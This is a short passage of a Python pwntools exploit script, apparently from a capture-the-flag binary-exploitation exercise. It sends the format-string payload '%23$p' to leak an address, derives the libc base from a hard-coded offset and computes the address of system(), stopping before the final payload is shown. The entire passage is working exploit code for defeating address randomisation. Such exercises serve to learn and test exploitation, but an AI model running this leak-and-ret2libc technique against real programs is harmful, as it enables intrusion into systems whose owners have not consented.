...
io.recvuntil(": ")
io.sendline("%23$p")
main_start = int(io.recvline()[2:-1], 16)
LIBC_base = main_start - 0x0270b3
system = LIBC_base + libc.symbols["system"]
# log.info('{:x}'.format(libc.symbols["system"]))
# log.info('{:x}'.format(system))
